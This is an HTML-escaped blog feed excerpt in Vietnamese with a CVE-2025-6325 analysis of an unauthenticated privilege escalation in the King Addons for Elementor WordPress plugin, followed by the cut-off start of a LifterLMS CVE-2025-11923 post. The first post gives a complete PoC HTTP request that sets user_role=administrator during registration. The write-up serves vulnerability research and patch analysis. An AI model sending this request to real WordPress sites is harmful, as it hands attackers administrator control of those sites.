width=&#34;1688&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search sink v51.1.36&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta thấy, tại &lt;code&gt;file Login_Register_Form_Ajax.php&lt;/code&gt;, hàm &lt;code&gt;Login_Register_Form_Ajax::handle_register_ajax()&lt;/code&gt; cho phép nhận trực tiếp giá trị &lt;code&gt;$user_role&lt;/code&gt; từ request và gán vào mảng &lt;code&gt;$user_data&lt;/code&gt; trước khi gọi &lt;code&gt;wp_insert_user()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Đây chính là &lt;strong&gt;sink&lt;/strong&gt; của lỗ hổng, vì dữ liệu đầu vào không đáng tin cậy được truyền vào trực tiếp, gây ra &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;handle_register_ajax()&lt;/code&gt; được đăng ký làm callback cho action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&#xA;    &amp;#39;wp_ajax_nopriv_king_addons_user_register&amp;#39;,&#xA;    [&amp;#39;King_Addons\Widgets\Login_Register_Form\Login_Register_Form_Ajax&amp;#39;, &amp;#39;handle_register_ajax&amp;#39;]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong đó:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; là action hook dành cho &lt;strong&gt;tất cả người dùng&lt;/strong&gt;, kể cả những người chưa đăng nhập.&lt;/li&gt;&#xA;&lt;li&gt;Khi gửi request tới endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với &lt;code&gt;action=king_addons_user_register&lt;/code&gt;, WordPress sẽ gọi &lt;code&gt;handle_register_ajax()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;King_Addons\Widgets\Login_Register_Form\Login_Register_Form_Ajax&#39;&lt;/code&gt; liên quan đến widget &lt;strong&gt;Login/Register Form&lt;/strong&gt; của plugin &lt;strong&gt;King Addons for Elementor&lt;/strong&gt;.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/form.png&#34; title=&#34;Login/Register Form của King Addons for Elementor&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/form.png&#34; data-sub-html=&#34;&lt;h2&gt;Form&lt;/h2&gt;&lt;p&gt;Login/Register Form của King Addons for Elementor&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/form.png&#39; alt=&#34;Form&#34; height=&#34;857&#34; width=&#34;1916&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Login/Register Form của King Addons for Elementor&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; Khi người dùng gửi form đăng ký này, dữ liệu nhập vào sẽ được &lt;strong&gt;truyền trực tiếp vào hàm &lt;code&gt;handle_register_ajax()&lt;/code&gt;&lt;/strong&gt; xử lý:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/r_enable.png&#34; title=&#34;Tính năng user registration&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/r_enable.png&#34; data-sub-html=&#34;&lt;h2&gt;Registration Enable&lt;/h2&gt;&lt;p&gt;Tính năng user registration&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/r_enable.png&#39; alt=&#34;Registration Enable&#34; height=&#34;453&#34; width=&#34;1620&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tính năng user registration&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Hàm chỉ tiếp tục xử lý nếu tính năng &lt;strong&gt;user registration&lt;/strong&gt; được bật, ta có thể bật nó trong Admin Dashboard:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/membership.png&#34; title=&#34;Bật tính năng user registration&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/membership.png&#34; data-sub-html=&#34;&lt;h2&gt;Member Ship&lt;/h2&gt;&lt;p&gt;Bật tính năng user registration&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/membership.png&#39; alt=&#34;Member Ship&#34; height=&#34;878&#34; width=&#34;1074&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bật tính năng user registration&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi tiếp tục phân tích phiên bản &lt;strong&gt;v51.1.36&lt;/strong&gt;, tôi nhận thấy một comment giải thích rằng đoạn code bên dưới là &lt;strong&gt;bản vá bảo mật&lt;/strong&gt;, nhằm chống &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/analysis.png&#34; title=&#34;Phần comment&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/analysis.png&#34; data-sub-html=&#34;&lt;h2&gt;Analysis&lt;/h2&gt;&lt;p&gt;Phần comment&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/analysis.png&#39; alt=&#34;Analysis&#34; height=&#34;519&#34; width=&#34;1721&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Phần comment&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;So sánh với danh sách các lỗ hổng đã công bố của plugin &lt;strong&gt;King Addons for Elementor&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/compare.png&#34; title=&#34;So sánh&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/compare.png&#34; data-sub-html=&#34;&lt;h2&gt;Compare&lt;/h2&gt;&lt;p&gt;So sánh&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/compare.png&#39; alt=&#34;Compare&#34; height=&#34;1021&#34; width=&#34;1537&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;So sánh&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Trong danh sách này chỉ có &lt;strong&gt;1 lỗ hổng Privilege Escalation&lt;/strong&gt; được ghi nhận.&lt;/li&gt;&#xA;&lt;li&gt;Tuy nhiên, ở phiên bản &lt;strong&gt;v51.1.36&lt;/strong&gt;, lỗ hổng này đã được vá.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; Điều này có nghĩa rằng &lt;strong&gt;phiên bản v51.1.36 không còn có thể bị khai thác lỗ hổng này&lt;/strong&gt;.&#xA;Đây chính là lý do tại phần &lt;a href=&#34;#requirements&#34;&gt;&lt;strong&gt;Requirements&lt;/strong&gt;&lt;/a&gt; tôi yêu cầu sử dụng phiên bản &lt;strong&gt;v51.1.14&lt;/strong&gt;, vì phiên bản này &lt;strong&gt;chưa chứa bản vá&lt;/strong&gt;, vẫn còn lỗ hổng để phục vụ phân tích hoặc thử nghiệm.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/role.png&#34; title=&#34;Code v51.1.14&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/role.png&#34; data-sub-html=&#34;&lt;h2&gt;Code v51.1.14&lt;/h2&gt;&lt;p&gt;Code v51.1.14&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/role.png&#39; alt=&#34;Code v51.1.14&#34; height=&#34;521&#34; width=&#34;1771&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Code v51.1.14&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated User&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Submit Register Form (King Addons Login/Register Widget)&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;POST /wp-admin/admin-ajax.php&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;action=king_addons_user_register&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;wp_ajax_nopriv_king_addons_user_register&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Login_Register_Form_Ajax::handle_register_ajax()&amp;#34;]&#xA;&#xA;F --&amp;gt; G{&amp;#34;User Registration Enabled?&amp;#34;}&#xA;G -- No --&amp;gt; H[&amp;#34;Abort&amp;#34;]&#xA;G -- Yes --&amp;gt; I[&amp;#34;Read POST parameters&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;user_role taken directly from request&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Build user_data array&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;wp_insert_user(user_data)&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;WordPress assigns role from user_role&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;User account created with elevated role&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Submit form register và cho request đi qua Burp Proxy&lt;/li&gt;&#xA;&lt;li&gt;Thêm &lt;code&gt;user_role&lt;/code&gt; param với giá trị &lt;code&gt;administrator&lt;/code&gt; vào request và gửi:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;&#xA;action=king_addons_user_register&amp;amp;nonce=2d3fdafcc0&amp;amp;email=abc%40gmail.com&amp;amp;username=abc&amp;amp;password=Hacker111%3F&amp;amp;confirm_password=Hacker111%3F&amp;amp;widget_id=c03756f&amp;amp;recaptcha_secret_key=&amp;amp;recaptcha_score_threshold=0.5&amp;amp;redirect_after_register=&amp;amp;terms_required=no&amp;amp;enable_user_email=yes&amp;amp;user_email_subject=Welcome&amp;#43;to&amp;#43;%7Bsite_name%7D!&amp;amp;user_email_content=Hello&amp;#43;%7Buser_name%7D%2C%0A%0AWelcome&amp;#43;to&amp;#43;%7Bsite_name%7D!%0A%0AYour&amp;#43;account&amp;#43;has&amp;#43;been&amp;#43;successfully&amp;#43;created.%0A%0AUsername%3A&amp;#43;%7Busername%7D%0AEmail%3A&amp;#43;%7Buser_email%7D%0A%0AThank&amp;#43;you&amp;#43;for&amp;#43;joining&amp;#43;us!%0A%0ABest&amp;#43;regards%2C%0A%7Bsite_name%7D&amp;#43;Team&amp;amp;enable_admin_email=no&amp;amp;admin_email_address=&amp;amp;admin_email_subject=&amp;amp;admin_email_content=&amp;amp;enable_mailchimp_integration=no&amp;amp;mailchimp_api_key=&amp;amp;mailchimp_list_id=&amp;amp;mailchimp_double_optin=no&amp;amp;auto_login_after_register=yes&amp;amp;user_role=administrator&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/result.png&#39; alt=&#34;Result&#34; height=&#34;662&#34; width=&#34;1544&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Login bằng tài khoản đã tạo&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/login.png&#34; title=&#34;Login&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/login.png&#34; data-sub-html=&#34;&lt;h2&gt;Login&lt;/h2&gt;&lt;p&gt;Login&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/login.png&#39; alt=&#34;Login&#34; height=&#34;740&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Login&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-6325&lt;/strong&gt; trong plugin &lt;strong&gt;King Addons for Elementor&lt;/strong&gt; cho phép &lt;strong&gt;Privilege Escalation&lt;/strong&gt; thông qua form đăng ký người dùng. Nguyên nhân chính là giá trị &lt;code&gt;user_role&lt;/code&gt; được lấy trực tiếp từ request mà không kiểm tra trước khi gán cho tài khoản mới. Phiên bản &lt;strong&gt;v51.1.14&lt;/strong&gt; vẫn chứa lỗ hổng này, trong khi &lt;strong&gt;v51.1.36&lt;/strong&gt; đã được vá, do đó không thể khai thác nữa. Việc phân tích diff giữa các phiên bản cho thấy bản vá giới hạn role được phép và tránh tình trạng người dùng gán role nguy hiểm như &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Lỗ hổng xuất phát từ &lt;strong&gt;thiếu kiểm soát input (untrusted input)&lt;/strong&gt; trong hàm xử lý đăng ký AJAX.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; cho phép &lt;strong&gt;người dùng chưa đăng nhập&lt;/strong&gt; gửi request tới endpoint và khai thác lỗ hổng.&lt;/li&gt;&#xA;&lt;li&gt;Bản vá giới hạn danh sách role được phép (&lt;code&gt;subscriber&lt;/code&gt;, &lt;code&gt;customer&lt;/code&gt;) để &lt;strong&gt;ngăn leo thang đặc quyền&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Khi phân tích lỗ hổng, luôn so sánh &lt;strong&gt;phiên bản vulnerable vs patched&lt;/strong&gt; để xác định thay đổi bảo mật.&lt;/li&gt;&#xA;&lt;li&gt;Sử dụng phiên bản &lt;strong&gt;cũ (v51.1.14)&lt;/strong&gt; có thể phục vụ mục đích phân tích hoặc PoC, nhưng không nên triển khai trên môi trường production.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/king-addons/vulnerability/wordpress-king-addons-for-elementor-plugin-51-1-36-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress King Addons for Elementor Plugin &amp;lt;= 51.1.36 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11923 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-02-cve-2025-11923/</link>
      <pubDate>Fri, 02 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-02-cve-2025-11923/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-02-cve-2025-11923/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin LifterLMS cho WordPress bị lỗ hổng &lt;strong&gt;lộ thông tin nhạy cảm&lt;/strong&gt; trong tất cả các phiên bản từ trước đến &lt;strong&gt;9.1.0&lt;/strong&gt;, thông qua endpoint REST API &lt;strong&gt;/mcp/v1/&lt;/strong&gt;. Lỗ hổng này làm lộ &lt;strong&gt;Bearer Token&lt;/strong&gt; khi tùy chọn &lt;strong&gt;“No-Auth URL”&lt;/strong&gt; được bật. Điều này cho phép kẻ tấn công &lt;strong&gt;không cần xác thực&lt;/strong&gt; lấy được bearer token, từ đó có thể truy cập vào một phiên làm việc hợp lệ và thực hiện nhiều hành động như &lt;strong&gt;tạo tài khoản quản trị viên mới&lt;/strong&gt;, dẫn đến &lt;strong&gt;leo thang đặc quyền&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11923&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11923&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 9.1.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 9.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Student&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/lifterlms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LifterLMS Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener 